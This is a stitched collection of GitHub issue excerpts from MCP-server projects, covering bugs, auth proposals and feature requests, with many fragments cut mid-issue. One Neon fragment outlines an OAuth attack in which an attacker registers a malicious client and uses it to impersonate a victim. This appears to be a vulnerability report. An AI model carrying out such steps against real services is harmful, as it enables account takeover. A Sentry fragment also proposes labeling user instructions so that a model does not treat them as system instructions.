The idea of integrating an AI agent to assist users in creating a MongoDB cluster is a great way to enhance user experience and ensure accuracy in executing commands. Here’s a refined approach to how an agent might interact with a user to create a cluster, ensuring that actions are verified before execution:

### Scenario: AI Agent Assists in Creating a MongoDB Cluster

#### Context:
A user wants to set up a new project and create a MongoDB cluster. The AI agent will guide the user through the process using natural language understanding and command-line interface (CLI) integration.

#### Steps:

1. **Initiate the Interaction:**
   - **Agent:**  Do you want to connect your generted Aplication to mongodb - ould you like me to guide you through the process?""

2. **Gather Project Details:**
   - **Agent:** ""Let's start by creating a new project. Could you please provide a name for your new project?""
   - **User:** ""Let's name it 'ProductionApp'.""

3. **Confirm and Create Project:**
   - **Agent:** ""Great! I'll create a project named 'ProductionApp'. Here's the command I'll use: `mongo-atlas project create --name ProductionApp`. Would you like to proceed?""
   - [User confirms the action, and the agent executes the command.]

4. **Define Cluster Configuration:**
   - **Agent:** ""Now, let's set up your cluster. What would you like to name your cluster?""
   - **User:** ""Let's call it 'ProdCluster'.""

5. **Gather Cluster Specifications:**
   - **Agent:** ""What cluster tier would you like? Options include M0 (free tier), M2, M5, etc.""
   - **User:** ""Let's go with M10.""

   - **Agent:** ""Which cloud provider and region would you prefer? For example, AWS in 'US-East-1'.""
   - **User:** ""AWS in 'US-West-2' sounds good.""

6. **Confirm and Create Cluster:**
   - **Agent:** ""Here's a summary of your cluster setup: \
     - Cluster Name: ProdCluster\
     - Tier: M10\
     - Provider: AWS\
     - Region: US-West-2 \
     \
     I'll use the following command to create your cluster:\
     `mongo-atlas cluster create --name ProdCluster --projectId <ProjectID> --tier M10 --provider AWS --region US-West-2`.\
     \
     Do you want to proceed?""
   - [User confirms, and the agent executes the command.]

7. **Final Confirmation and User Setup:**
   - **Agent:** ""Your cluster 'ProdCluster' is being created in the project 'ProductionApp'. Would you like to set up users or modify any access details now?""
   - **User:** ""Yes, please set up basic user access.""

8. **Create User and Assign Roles:**
   - **Agent:** ""Please provide a username and password for the new database user.""
   - **User:** ""Username: dbUser, Password: SecurePass123""
   
   - **Agent:** ""I'll create a user with these credentials and read-write access to all databases. The command is: `mongo-atlas dbuser create --username dbUser --password SecurePass123 --projectId <ProjectID> --role readWriteAnyDatabase`. Shall I proceed?""
   - [User confirms, and the agent executes the command.]

9. **Completion:**
   - **Agent:** ""Your MongoDB cluster 'ProdCluster' has been created successfully, and a user with the specified access has been set up. Is there anything else you'd like to do?""


Alternatives:
- Agent can create bash script for creation of those resources etc.
- Agent can populate atlas setup command aggregating all the options.

This approach ensures that the customer is informed and consents at each step, minimizing errors and improving the overall experience with guided, verified interactions."

elastic/mcp-server-elasticsearch,3493492395,211,Fix fastmcp 2.8.0 incompatibility with Pydantic 2.12.0,open,2025-10-08T01:14:34Z,2025-10-08T10:19:34Z,[],CaliLuke,"## Summary
Running `uvx elasticsearch-mcp-server` (v2.0.15) currently crashes during startup because the wheel hard-pins `fastmcp==2.8.0`, and that FastMCP release is incompatible with Pydantic 2.12.0 (released last week). The MCP process exits immediately with `TypeError: cannot specify both default and default_factory`, so Codex/Claude agents report the server as ""failed to start: request timed out"".

## Steps to reproduce
1. Ensure no existing virtualenv; run `uvx elasticsearch-mcp-server --help` (also reproduced with `uvx --temp` to isolate the environment).
2. `uvx` resolves dependencies, pulling `fastmcp==2.8.0` (per this project’s `Requires-Dist`) and the latest compatible `pydantic==2.12.0`.
3. Startup aborts during FastMCP settings import with the stack trace below.

```
Traceback (most recent call last):
  File "".../bin/elasticsearch-mcp-server"", line 6, in <module>
    from src.server import elasticsearch_mcp_server
  File "".../site-packages/src/server.py"", line 5, in <module>
    from fastmcp import FastMCP
  File "".../site-packages/fastmcp/__init__.py"", line 4, in <module>
    from fastmcp.settings import Settings
  File "".../site-packages/fastmcp/settings.py"", line 56, in <module>
    class Settings(BaseSettings):
  File "".../pydantic/_internal/_model_construction.py"", line 242, in __new__

  File "".../pydantic/fields.py"", line 232, in __init__
    raise TypeError('cannot specify both default and default_factory')
TypeError: cannot specify both default and default_factory
```

## Expected behaviour
`uvx elasticsearch-mcp-server --help` should print the help banner and keep the process alive for agent clients.

## Actual behaviour
Process exits immediately with the error above, so MCP clients treat the server as failing to initialize.

## Notes
- Installing with `uvx --with pydantic==2.11.3 elasticsearch-mcp-server --help` works, as does `uvx --with fastmcp==2.12.4 ...`.
- `fastmcp` fixed the offending field definition in newer releases; upgrading the pin (e.g. to 2.12.0+) or adding an upper bound on Pydantic would solve the regression.
- Environment:
  - macOS 14.7 (arm64)
  - uv 0.5.2
  - elasticsearch-mcp-server 2.0.15
  - fastmcp 2.8.0 (pinned by this project)
  - pydantic 2.12.0 (auto-resolved)

- Local: `*<pattern>*`

Example for `.monitoring` pattern:

```
GET _resolve/index/*:*.monitoring*,*.monitoring*?filter_path=*.name

This would provide a much more cohesive experience for users who have no idea where the data lives.

It also provides context as to whether the found match is an ""indices"", ""aliases"" or ""data_streams""."

elastic/mcp-server-elasticsearch,3345076512,192,"MCP get_mappings fails with ""error decoding response body"" when retrieving Elasticsearch index mapping Description",closed,2025-08-22T10:57:14Z,2025-10-20T16:17:21Z,[],rafaeljimenez85,"# Description
When attempting to retrieve an index mapping from an Elasticsearch instance using the MCP, the operation fails with a JSON-RPC internal error. The server-side logs confirm a response error with the same message, suggesting a problem with parsing or decoding the response received from the Elasticsearch API.

# Steps to Reproduce
- Connect the MCP server to an Elasticsearch instance (version 8.11.1).
- Ensure at least one index exists in Elasticsearch.
- Execute a request via the MCP to retrieve the mapping of a specific index.

# Expected Behavior
The MCP should successfully retrieve the index mapping from Elasticsearch and return the complete mapping structure as a JSON object to the client.

# Actual Behavior
The MCP client receives the following error response:
```json
[
  {
    ""response"": ""MCP error -32603: error decoding response body""
  }
]
```

# Additional Context
The error suggests that the response from the Elasticsearch _mapping API endpoint might not be in the format that the MCP is expecting, leading to a deserialization failure. This could be due to a change in the API response in Elasticsearch v8.11.1 or an issue in the MCP's response handling logic."

**Difference**: The working mapping includes ""type"": ""nested"" for the ""comments"" property.

The first mapping is valid and accepted by Elasticsearch, but the `get_mappings` tool fails to process it. This behavior is unexpected and may indicate a bug or an undocumented constraint in the tool’s handling of mappings.

**Expected Behavior:**
The tool should correctly decode and return mappings even when the ""type"": ""nested"" is omitted, as long as the mapping is valid per Elasticsearch standards.

elastic/mcp-server-elasticsearch,3243850752,164,Proposal: Enhanced Context Management for MCP-Elasticsearch Integration,closed,2025-07-18T17:12:17Z,2025-08-07T22:17:00Z,[],abhikollam,"# Summary

This proposal outlines the addition of persistent context management capabilities to the Model Context Protocol (MCP) implementation for Elasticsearch. Currently, the MCP server functions mainly as a request-response bridge without retaining conversational context between interactions. By adding context management, we can enable more natural, iterative search experiences where follow-up queries can build upon previous results and interactions.
 ## Current Limitations
 Based on the analysis of the current mcp-server-elasticsearch implementation:
 *      
* Each request is processed independently without awareness of previous queries.     
* Context is limited to authentication and session management.     
* Users must explicitly restate search parameters for every query refinement.     
* No built-in mechanism to track conversation history or evolving search intent.     
* Limited ability to support natural language refinements to previous queries. 

  ## Proposed Solution
 ### Core Capabilities
 *      
* **Conversation History Store:**         
   *              
   * Maintain a persistent record of user queries and result metadata.             
   * Store conversation turns with unique identifiers.             
   * Track timestamps and sequence information.         
          
* **Context-Aware Query Processing:**         
   *              
   * Enrich incoming queries with relevant historical context.             
   * Interpret follow-up queries in relation to previous searches.             
   * Support incremental query refinement.         
          
* **Context Management API:**         
   *              
   * Endpoints to retrieve, update, and clear conversation context.             
   * Methods to merge new query constraints with existing context.             
   * Ability to refer back to specific previous queries.         
          
* **Configurable Persistence:**         
   *              
   * In-memory storage for ephemeral sessions.             
   * Optional persistence to Elasticsearch itself for longer-term storage.             
   * Configurable context expiry and retention policies.

## Implementation Strategy
  ### Phase 1: In-Memory Context Store
 *      
* Add conversation tracking with in-memory storage     
* Implement basic context merging for queries     
* Add context identifiers to protocol messages 

  ### Phase 2: Context-Aware Query Enhancement
 *      
* Develop query augmentation based on previous context     
* Implement filter accumulation and refinement     
* Add natural language references to previous results 

  ### Phase 3: Persistent Context Storage
 *      
* Add Elasticsearch-based context persistence     
* Implement context expiration and pruning     
* Support cross-session context retrieval

## API Extensions
New MCP tools would include:

```
rust
// Create or retrieve a conversation context
async fn get_conversation_context(&self, conversation_id: Option) -> Result;

// Execute query with context awareness
async fn search_with_context(&self, query: SearchParams, context_id: String) -> Result;

// Update existing context with new parameters
async fn update_context(&self, context_id: String, updates: ContextUpdates) -> Result;

// Clear or reset conversation context
async fn reset_context(&self, context_id: String) -> Result<()>; 
```
## Benefits for the Elasticsearch Community
### Enhanced User Experience
* More natural search interactions for AI assistants
* Reduced query complexity for users
* Support for conversational search patterns

### Increased Search Efficiency
* Less duplication in query construction
* Leveraging previous search results for refinement
* Progressive query building without repetition

### New Integration Opportunities
* Better integration with AI assistants and chat interfaces
* Framework for building specialized search applications
* Support for multi-turn search experiences

### Competitive Advantage
* Differentiation from basic search interfaces
* Alignment with modern conversational AI patterns
* Foundation for more sophisticated search experiences"

However, the current code enforces these authentication parameters as required

```typescript
.refine(

    return !!data.apiKey || (!!data.username && !!data.password);

## Could we make authentication optional for local development environments? 
1. Simplify local development setup
2. Match default Elasticsearch behavior where authentication is not required by default
3. Allow developers to quickly test and iterate without configuring auth credentials

## Proposed solution
- Make authentication parameters truly optional

Let me know your thoughts on this approach.

I'm using the mcp with Claude via the claue_desktop_config.json, which VS-code automatically taps into.

It seems that at random intervals (Usually around every five minutes, possibly), VS Code tries to re-auth with Neon. It opens up four new tabs in my browser.

It's especially frustrating if I walk away from my computer for a bit. I'll come back to 50 tabs opened.

1. Attacker registers a malicious OAuth client using the public `/register` endpoint. This endpoint lets them define their _redirect_uri_
1. Because the _redirect_uri_ is under their control, they can initiate an OAuth authorization flow using the malicious client.
1. When a victim clicks a specially crafted link (with the attacker's _client_id_ and _redirect_uri_), the victim is redirected to the attacker's domain with a valid code.
1. The attacker can now exchange that code for a valid _access_token_, as:
	1. They control the _client_id_ and _redirect_uri_
	1. They generated the PKCE code_verifier themselves
1. This lets the attacker impersonate the victim, as the access token reflects the victim’s session and authorization.


Neon's OAuth server does show a warning to the end-user/victim about the dynamically registered clients in call cases with _client_id_, _client_name_, and _redirect_uris_; however, this is not enough to prevent this impersonating attack. "
neondatabase/mcp-server-neon,3057457161,57,Need Non-OAuth Agent Authentication & Startup Fails (PostgreSQL Dependency?),closed,2025-05-12T16:03:53Z,2025-06-19T16:51:21Z,[],Nivg,"# MCP Server: Need Non-OAuth (API Key) Agent Authentication & Startup Fails (PostgreSQL Dependency?)

Hello Neon Team,

My primary goal is to integrate a Python Anthropic agent with a self-hosted Neon MCP server instance (locally for development, potentially cloud-hosted for production). The main challenge I'm facing is the current OAuth-centric user flow, which is not suitable for non-interactive agents.

Additionally, while attempting to set up the MCP server locally to explore workarounds or test integrations, I'm encountering a startup failure related to a PostgreSQL dependency.

## 1. Primary Challenge: Agent Authentication (Non-OAuth Required)

For programmatic clients like my Python agent, the standard OAuth user flow (involving browser redirects and user logins) is not a viable authentication mechanism. Agents require a direct, non-interactive way to authenticate with the MCP server.

**Desired Authentication Method for Agents:**

A common and suitable approach would be to use the Neon API key directly for authentication, for instance, via an `Authorization: Bearer <NEON_API_KEY>` header.

* Only the ""init"" and ""stdio"" methods (presented in the index.ts) support it, but they are less suitable for my use case.

**Current Workaround/Experiment:**

To test this concept, I have locally modified the MCP server source code to accept such an `Authorization` header. If a valid Neon API key is provided, it authenticates the request for the agent, bypassing the OAuth flow. This approach proves the concept works for my use case.

<img width=""1694"" alt=""Image"" src=""https://github.com/user-attachments/assets/32d7285f-a42e-4484-9bca-4880e2411b6a"" />

## 2. Secondary (Blocking) Issue: MCP Server Startup Failure (ECONNREFUSED)

While trying to set up the MCP server locally to test the agent integration mentioned above, I am unable to get the server to start.

### Steps to Reproduce Startup Failure (without my concept fix):

1. Install the MCP server globally: `npm install -g @neondatabase/mcp-server-neon`
2. Attempt to start the server: `npx -y @neondatabase/mcp-server-neon start <MY_VALID_NEON_API_KEY>`

Error:
```bash

```

## Environment (Local Attempt):

Node.js: v22.15.0
npm: 10.9.2
OS: Latest macOS

## Questions Regarding Server Setup/Dependency

1. Is a PostgreSQL instance a hard requirement for the MCP server's keyv stores?
2. If PostgreSQL is required, how can its connection details be configured for a self-hosted MCP server (e.g., environment variables, config file)?
3. Is there an option to use an in-memory store (e.g., keyv-mem) for these stores, particularly for local development or simpler deployments
4. Could the prerequisites and configuration steps for self-hosting be clearly documented?


**Note that after my concept changes I build and just run the server locally (`node dist/index.js start:sse`) without any issues.**

---

My suspicions are: 

The issue is, we make a lot of parameters optional, like the DBname . So, the LLM sees that it's optional and sometimes it doesn't pass anything for that parameter because it's not sure what to pass, and our ""default"" for when nothing is passed in, is neondb.  So it's not a super easy problem to tackle, because more often than not, it's a problem with the human, that's not passing enough context, although, I'm not sure if this was the case this time around!"

OpenAI tool `parameters` -> `properties` do support `array` type but then `items` needs to be specified to be clear about inner array type. See https://platform.openai.com/docs/guides/function-calling?example=get-weather -> https://json-schema.org/understanding-json-schema/reference/array

Also there is an issue with tool naming where we use '--' in the tool name, some clients like the https://5ire.app/ uses '--' to separate MCP client namespace and the tool name: see https://github.com/nanbingxyz/5ire/blob/100f9517bda87a5a11b31527437a6e21c1a4c23d/src/intellichat/services/NextChatService.ts#L214; So we should change this to something else if possible if we want to support as many clients possible

Other issue while working with https://5ire.app/ was the default 60 seconds MCP client tool call timeout, for example the RAG browser was too slow to respond and I had to override the default MCP client timeout in the source code."

## Overview

We'd like to create a standardized enterprise deployment blueprint for Chroma MCP Server to help increase adoption among enterprise users. This blueprint would be completely free, open-source, and require minimal involvement from the project maintainers.

## What We're Offering

[wirtual.dev](https://wirtual.dev) is creating standardized deployment blueprints for leading open-source AI applications. We'd like to create one for Chroma MCP Server that would:

- Package Chroma MCP Server as a standardized blueprint for one-click enterprise deployment
- Add enterprise-grade security controls and governance
- Integrate with a shared context layer for interoperability with other AI applications
- Provide a secure environment for customization and extension

## Value to Chroma MCP Server

This blueprint would:

1. **Increase enterprise adoption** by removing deployment complexity barriers
2. **Enhance security posture** for sensitive API keys and authentication credentials
3. **Streamline configuration management** across different client types (persistent, HTTP, cloud)
4. **Simplify scaling** for production deployments with multiple collections and high query volumes
5. **Preserve full compatibility** with Claude Desktop and other MCP clients

## What We Need From You

- Permission to create this open-source blueprint for Chroma MCP Server
- Optional: Any guidance on deployment best practices not already in documentation
- Optional: Review of the blueprint when complete (though not required)

## Important Assurances

- The blueprint will be completely **open-source** under the same Apache 2.0 license
- There is **no vendor lock-in** - users can deploy without our platform if desired
- The project **remains independent** - this is simply an additional deployment option
- No changes to the core codebase are needed

## Project Alignment and Contribution Process

We're reaching out before beginning work to ensure our blueprint aligns with your project's vision and contribution standards. This approach helps us:

1. Confirm the blueprint would be welcomed by the project maintainers
2. Understand any specific requirements or preferences you might have
3. Establish clear expectations about the review and merging process
4. Ensure we're not duplicating efforts already underway

## Next Steps

If you're open to this collaboration, we'd appreciate:

1. Confirmation that this type of contribution would be welcomed
2. Any specific guidance on how you'd prefer we submit the final work (PR process, review expectations, etc.)
3. Indication of any aspects of the proposal that need adjustment to better align with your project

We're happy to answer any questions or address any concerns you might have before proceeding.

Thank you for considering our proposal!"

https://arxiv.org/pdf/2502.12110v1

the server serves as a guiding principle of getting claude to think. It works well for one shot solutions (examples shown include one-shotting a game(impressive)). however, i believe extending this to serve as storing thoughts for llms can prove useful. this will provide guiding principles + recall + storage of thoughts.

the guiding principle of llm's should be the scientific method. ideate -> hypothesize <=> test -> conclude

here is a list of goals
1. allow the model to store thoughts while reasoning in chroma (https://github.com/chroma-core/chroma-mcp/pull/10)
2. search for similar thoughts, and retrieve + use as context if exceeds some threshold (https://github.com/chroma-core/chroma-mcp/pull/10)
3. discerning when to store a thought or not (this one is quite tricky: how would a model know if this thought is ""good"" or bad? relevance to previous thoughts in the session? too close to previous and it never learns to be creative. or maybe this isn't something you do at insert time, but rather a pruning method -> see 4)
4. retroactively pruning thoughts that serve no use
5. the ability to backtrack thoughts, and branch from there
6. merging branches of thought, maintaining learnings from the failed branches, and identifying why the successful branch of thought was successful
7. thought pattern analytics: how do certain thought patterns yield better results ie the scientific method of hypothesis -> reason/test -> revise -> conclude
8. differentiate thought processes between different types of problems (left vs right brain, analytical vs creative)
9. allow the llm to decide what was a ""successful"" chain of thought
10. allow for handoffs to users. it is quite frustrating that llms (claude especially) does not ask for others' opinions and does what it feels is best (hence the memes about claude deleting half a codebase). this is key to llm safety
11. adding user personalization -> long term memory of dialogue, and relevant user info to track for future conversations "

Here are the details:

Environment:

Docker Image: chromadb/chroma:0.6.4dev181

Created collection name: document (likely, based on context).

Problem:
When calling the get_list_collections API with {""limit"": 10, ""offset"": 0}, no response is returned.
Attempting to use get_documents or get_collection_info with {""collection_name"": ""documents""} results in errors:

Error: Collection ""documents"" does not exist.
Observations/Suspicions:

Name Mismatch: The created collection might be named document (singular), but the API requests use documents (plural). Chroma collections are case-sensitive and require exact name matches.

Data Persistence: If Docker volumes are not properly configured, the collection might not persist after container restarts.

API/Version Issues: The 0.6.4dev181 image is a development build and might contain bugs affecting collection visibility.

Steps to Reproduce:

Create a collection named document.

Call get_list_collections – no response.

Call get_documents/get_collection_info with ""documents"" – collection not found.

Request for Assistance:
Please help resolve the collection access issue. Potential areas to explore:

Confirming collection naming consistency.

Debugging Docker volume/persistence settings.

Identifying known issues in the 0.6.4dev181 build.

### Steps to Reproduce

Login to sentry with `/mcp`.

After login it says:

```

Add a small sanitizer layer: prefix the user instruction with a controlled label, e.g., ""User-provided instruction (for guidance only):\n<user text>"" so Seer can't treat it as the system-level instruction.

Add permissions: restrict [instruction](vscode-file://vscode-app/Applications/Visual%20Studio%20Code.app/Contents/Resources/app/out/vs/code/electron-browser/workbench/workbench.html) usage to higher privileged roles or require an explicit opt-in flag.

  Total Error Events: 402,762
  Key Insights

  - Error Volume: 402,762 total error events occurred in the past 30 days
  - Issue Grouping: These errors are grouped into 100+ unique issue types                                                                                                                                               - Ratio: Each unique issue represents an average of ~4,000 error events, showing significant error grouping efficiency
                                                                                                                                                                                                                        The high ratio of events to issues indicates that Sentry's grouping algorithm is effectively clustering similar errors together, with some issues like SEER-SY generating 25,970 events and SENTRY-414F
  generating 91,146 events from single root causes.

  ⎿  Error: **Input Error**

     There was an HTTP 400 error with your request to the Sentry API.

     API error (400): A single field cannot be used both inside and outside a function in the same query. To use issue.id you must first remove the function(s): count_unique(issue)

     You may be able to resolve the issue by addressing the concern and trying again.

⏺ sentry - search_events (MCP)(naturalLanguageQuery: ""count_unique(issue) distinct issues in the last 30 days"")
  ⎿  # Search Results for ""count_unique(issue) distinct issues in the last 30 days""

     ⚠️ **IMPORTANT**: Display these aggregate results as a data table with proper column alignment and formatting.
     … +21 lines (ctrl+o to expand)

⏺ Perfect! Here's the final comparison:

  Unique Issues vs Total Errors (Last 30 Days)

  - Unique Issues: 203 distinct issues
  - Total Error Events: 400,232+ events
  - Average Events per Issue: ~1,970 events per unique issue

  This shows that Sentry's error grouping is effectively consolidating similar errors, with each unique issue representing approximately 2,000 error events on average.

The current OAuth implementation requires localhost callbacks
  (http://localhost:5173/oauth/callback), which doesn't work on headless servers or remote
  development environments where opening a browser locally isn't possible.

  Problem:
  - Users on headless machines cannot complete OAuth authentication
  - SSH port forwarding is a workaround but adds complexity
  - User Auth Tokens are the only current alternative but pose security concerns for some deployments

  Proposed Solution:
  Implement OAuth 2.0 Device Code Flow (RFC 8628) as an alternative authentication method. This would
   allow users to:

  1. Run a command that generates a device code and verification URL
  2. Open the URL on any device with a browser
  3. Enter the device code to authorize the application
  4. Complete authentication without requiring localhost callbacks

  Example Flow:
  `sentry-mcp auth --device-code`
  Output: `Go to https://sentry.io/device and enter code: ABC-123`
  User enters code in browser, auth completes automatically

  Use Cases:
  - Remote development servers
  - Docker containers
  - CI/CD environments
  - Any headless deployment where browser access isn't available locally

  Additional Context:
  This is a standard OAuth flow supported by many platforms (GitHub, Google, Microsoft) specifically
  for headless/device scenarios. It maintains security while enabling headless authentication."

getsentry/sentry-mcp,3364747197,526,Embedded agent tools need regionUrl as passable argument alongside organizationSlug,closed,2025-08-28T21:36:39Z,2025-08-29T15:32:14Z,[],dcramer,"## Problem

Our embedded agent tools (whoami, datasetAttributes, otelSemantics) currently don't receive regionUrl as a parameter, which means they default to using the primary Sentry region. This causes issues when working with organizations in different regions.

## Current State

Based on our documentation analysis:

### Embedded Agent Tools Location
- /packages/mcp-server/src/internal/agents/tools/whoami.ts
- /packages/mcp-server/src/internal/agents/tools/dataset-fields.ts 
- /packages/mcp-server/src/tools/search-events/utils.ts (createDatasetAttributesTool)

### Current regionUrl Handling
- regionUrl is defined in the Constraints type in /packages/mcp-server/src/types.ts
- Multi-region support is documented in docs/api-patterns.mdc
- The API client helper apiServiceFromContext() accepts regionUrl as an option
- Parent tools (search_events, search_issues) receive regionUrl but don't pass it to embedded agents

## Required Changes

### 1. Update Embedded Agent Tool Creators
- [ ] Update createWhoamiTool() in /packages/mcp-server/src/internal/agents/tools/whoami.ts
- [ ] Update createDatasetFieldsTool() in /packages/mcp-server/src/internal/agents/tools/dataset-fields.ts
- [ ] Update createDatasetAttributesTool() in /packages/mcp-server/src/tools/search-events/utils.ts

### 2. Update Agent Callers
- [ ] Modify /packages/mcp-server/src/tools/search-events/agent.ts to pass regionUrl to embedded tools
- [ ] Modify /packages/mcp-server/src/tools/search-issues/agent.ts to pass regionUrl to embedded tools

### 3. Parameter Propagation
- [ ] Ensure regionUrl is properly passed from parent tool parameters to embedded agent tools
- [ ] Follow existing multi-region patterns documented in docs/api-patterns.mdc

## Testing Requirements

Following patterns from docs/testing.mdc:
- [ ] Unit tests for modified embedded agent tools with regionUrl scenarios
- [ ] Integration tests with mock API responses for different regions  
- [ ] Update existing test snapshots as needed
- [ ] Verify multi-region functionality works end-to-end

## Acceptance Criteria

- [ ] Embedded agent tools accept and use regionUrl parameter when provided
- [ ] Parent tools (search_events, search_issues) properly pass regionUrl to embedded agents
- [ ] Multi-region organizations work correctly with embedded agent functionality
- [ ] All existing tests pass and new tests cover multi-region scenarios
- [ ] Implementation follows existing patterns documented in docs/api-patterns.mdc

getsentry/sentry-mcp,3364491193,525,feat: Add permission-based tool selection to authorize dialog,closed,2025-08-28T19:49:26Z,2025-09-18T13:59:05Z,[],dcramer,"## Summary

Add a permission selection step to the authorize dialog that allows users to choose which tool permissions to grant. This will enable/disable specific MCP tools based on the selected permission levels.

## Proposed Permission Levels

1. **Read-only** (default)
   - Basic information retrieval tools
   - Search and view capabilities
   - No modification permissions

2. **Issue Triage**
   - Includes read-only permissions
   - Update issue status and assignment
   - Add comments to issues

3. **Project Management**
   - Includes issue triage permissions
   - Create/update projects and teams
   - Manage project settings and DSNs

## Implementation Requirements

- [ ] Update authorize dialog UI to include permission selection step
- [ ] Map permission levels to specific MCP tools
- [ ] Store selected permissions in user session/token
- [ ] Implement tool filtering based on granted permissions
- [ ] Update tool descriptions to indicate required permission level
- [ ] Add permission validation to tool execution
- [ ] Update documentation for permission system

## Technical Considerations

- Tools should gracefully handle permission denials
- Permission changes should require re-authorization
- Consider how permissions affect embedded tool calls in AI-powered search
- Ensure backward compatibility with existing authorizations

## Related

This enhances the security model by following the principle of least privilege, allowing users to grant only the permissions they need for their specific use case."

getsentry/sentry-mcp,3320530452,500,"Errors in test client are not propagated to user, only show 'No response generated'",open,2025-08-14T02:41:38Z,2025-08-14T02:41:38Z,[],dcramer,"## Problem

When the MCP test client encounters errors (such as invalid API keys, rate limits, or API service errors), these errors are not properly propagated to the user. Instead, the client simply displays ""(No response generated)"" which doesn't help users understand what went wrong.

## Current Behavior

- Invalid OpenAI API key → Shows ""(No response generated)""
- Rate limit errors → Shows ""(No response generated)""  
- Invalid/unrecognized commands → Shows ""(No response generated)""
- API service errors → Shows ""(No response generated)""

## Expected Behavior

The client should display meaningful error messages to help users understand what went wrong:
- Invalid API key → ""OpenAI API authentication failed. Please check your OPENAI_API_KEY environment variable.""
- Rate limits → ""OpenAI API rate limit exceeded. Please wait and try again.""
- Service errors → ""OpenAI API service error. The service may be temporarily unavailable.""

## Technical Details

The issue appears to be related to how the Vercel AI SDK's `streamText` function handles errors. When an invalid API key is provided, the stream returns empty (no chunks) rather than throwing an error or including error events in the stream.

### Code Location
- File: `packages/mcp-test-client/src/agent.ts`
- Function: `runAgent`
- Lines: ~53-140

### Investigation Notes

1. The AI SDK's `streamText` function doesn't throw synchronously for API errors
2. The `textStream` iterator completes without yielding any chunks when there's an API error
3. Error information might be available in `result.fullStream`, `result.response`, or `result.errorPromise` but these are not currently being checked

## Reproduction Steps

1. Set an invalid OpenAI API key: `export OPENAI_API_KEY=""sk-invalid-test-key""`
2. Run the test client: `pnpm run start:client`  
3. Enter any command (e.g., ""test"")
4. Observe that it shows ""(No response generated)"" instead of an authentication error

## Impact

Users cannot distinguish between:
- Configuration issues (wrong API key)
- Service issues (rate limits, outages)
- Invalid commands
- Actual empty responses

This makes debugging and troubleshooting very difficult."
getsentry/sentry-mcp,3320433857,499,feat: Add subpath-based organization and project constraints for MCP endpoint,closed,2025-08-14T01:45:35Z,2025-08-14T21:30:35Z,[],dcramer,"## Summary
Implement subpath-based organization and project constraints for the MCP endpoint, similar to Vercel's MCP implementation. This would allow URLs to enforce specific organization and project contexts based on the path structure.

## Motivation
Currently, the MCP endpoint is served at `/mcp` without any path-based constraints. Vercel's MCP implementation uses subpaths to set default projects, which provides better context isolation and user experience. We should adopt a similar pattern.

## Proposed Implementation

### URL Structure
- `/mcp` - No constraints (current behavior, kept for backward compatibility)
- `/mcp/{organizationSlug}` - Enforces organization context
- `/mcp/{organizationSlug}/{projectSlug}` - Enforces both organization and project context

### Examples
- `/mcp/sentry` - All operations constrained to the `sentry` organization
- `/mcp/sentry/mcp-server` - All operations constrained to the `sentry` organization and `mcp-server` project
- `/mcp/my-org/my-project` - Constrained to `my-org` organization and `my-project` project

### Key Differences from ""Defaults""
These are not ""defaults"" but **enforced constraints**:
- When using `/mcp/sentry`, the user cannot access resources from other organizations
- When using `/mcp/sentry/mcp-server`, the user cannot access resources from other projects
- This provides security isolation and prevents accidental cross-organization/project operations

## Technical Details

### Changes Required

1. **Route Handler Updates** (`packages/mcp-cloudflare/src/server/index.ts`):
   - Update the MCP endpoint registration to handle dynamic paths
   - Parse organization and project slugs from the URL path
   - Pass constraints to the MCP transport layer

2. **MCP Transport Updates** (`packages/mcp-cloudflare/src/server/lib/mcp-transport.ts`):
   - Accept organization/project constraints in the server context
   - Validate that all operations respect these constraints
   - Return appropriate errors when operations violate constraints

3. **Server Context Updates** (`packages/mcp-server/src/types.ts`):
   - Add optional `enforcedOrganizationSlug` and `enforcedProjectSlug` fields
   - Update tools to respect these constraints when present

4. **Tool Updates**:
   - Update all tools that accept `organizationSlug` or `projectSlug` parameters
   - When constraints are present, validate against them or auto-populate
   - Return clear error messages when constraints are violated

### Backward Compatibility
- The existing `/mcp` endpoint continues to work without constraints
- New subpath endpoints are additive and don't break existing integrations
- OAuth flow remains unchanged

### Security Considerations
- Constraints are enforced at the server level, not just client-side
- Prevents accidental data leakage across organization boundaries
- Provides clear audit trail of which context operations were performed in

## Acceptance Criteria
- [ ] `/mcp/{org}` endpoint enforces organization constraint
- [ ] `/mcp/{org}/{project}` endpoint enforces both constraints
- [ ] Original `/mcp` endpoint continues to work without constraints
- [ ] All tools respect enforced constraints when present
- [ ] Clear error messages when operations violate constraints
- [ ] Documentation updated with new endpoint patterns
- [ ] Tests added for constraint enforcement

## Related Work
- Similar to Vercel's MCP implementation approach
- Follows RESTful URL patterns for resource scoping

The current mcp.sentry.dev landing page lists tools, resources, and prompts but doesn't effectively communicate real-world use cases or help users understand what they can actually do with the Sentry MCP.

## Solution
Enhance the landing page with interactive examples and common workflows to better demonstrate the value and capabilities of the Sentry MCP.

## Proposed Improvements

### 1. Add 'Common Workflows' Section
Create a new section showcasing real-world scenarios with example queries:

- **Debug Production Errors**
  - Example: 'Show me errors affecting more than 100 users'
  - Example: 'Analyze issue PROJ-123 with AI for root cause'
  
- **Monitor Application Health**
  - Example: 'How many errors in the last 24 hours?'
  - Example: 'Show performance metrics for /api/checkout endpoint'
  
- **Manage Projects & Teams**
  - Example: 'Create a new project for my React app'
  - Example: 'Assign critical issues to backend team'

### 2. Interactive Examples
- Add copy-to-clipboard functionality for example queries
- Consider adding a 'Try this query' button that opens the chat interface with pre-filled text
- Group examples by user role (Developer, DevOps, Team Lead)

### 3. Visual Improvements
- Add icons for each workflow category
- Use cards or tiles for better visual organization
- Consider adding screenshots or GIFs showing the MCP in action

### 4. Quick Start Guide
- Move or duplicate the setup instructions higher on the page
- Add a 'Get Started in 2 Minutes' section
- Include common troubleshooting tips

### 5. Success Stories / Use Cases
- Add 2-3 concrete examples of problems solved with Sentry MCP
- Include metrics if available (e.g., 'Reduced debugging time by 50%')

## Implementation Notes
- Update packages/mcp-cloudflare/src/client/pages/home.tsx
- Consider creating reusable components for example cards
- Ensure mobile responsiveness for all new sections

## Benefits
- Reduces time-to-value for new users
- Makes capabilities immediately obvious
- Increases adoption by showing practical applications
- Provides inspiration for how to use the tool

New users don't know what they can do with the Sentry MCP after installation. There's no easy way to discover capabilities from within their LLM context.

## Solution
Add a queryable MCP resource that provides an interactive guide showing what users can do with Sentry MCP.

## Proposed Implementation

### Resource Definition
```typescript
// In resources.ts
{
  name: 'sentry-mcp-capabilities',
  uri: 'sentry://capabilities',
  description: 'Interactive guide showing what you can do with Sentry MCP',
  handler: capabilitiesHandler
}
```

### Content Structure
The resource should return markdown content with:

1. **Common Workflows** with example queries:
   - Debug production errors
   - Monitor application health
